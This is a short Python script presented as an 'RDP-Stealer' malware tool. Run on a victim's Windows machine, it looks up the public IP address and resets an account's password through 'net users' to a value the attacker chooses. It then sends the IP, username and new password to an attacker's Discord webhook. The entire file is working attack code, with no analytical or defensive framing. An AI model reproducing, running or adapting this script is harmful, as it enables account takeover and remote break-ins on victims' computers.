# RDP-Stealer (Simple version)
# Made by Morph

# Import module
import os
from time import sleep
from discord_webhook import DiscordWebhook, DiscordEmbed
from requests import get
import socket
import subprocess

ip = get('https://api.ipify.org').text
user = socket.gethostname()
passw = "password-@2" # Must include symbol and character length must more than 6
subprocess.call("net users "+user+" "+passw, shell = True)

# Webhook
webhook = DiscordWebhook(url='YOUR WEBHOOK')
embed = DiscordEmbed(title='Credential Logs', description=f'```\nIP Address : {ip}\nUsername : {user}\nPassword : {passw}\n```', color='03b2f8')
webhook.add_embed(embed)
response = webhook.execute()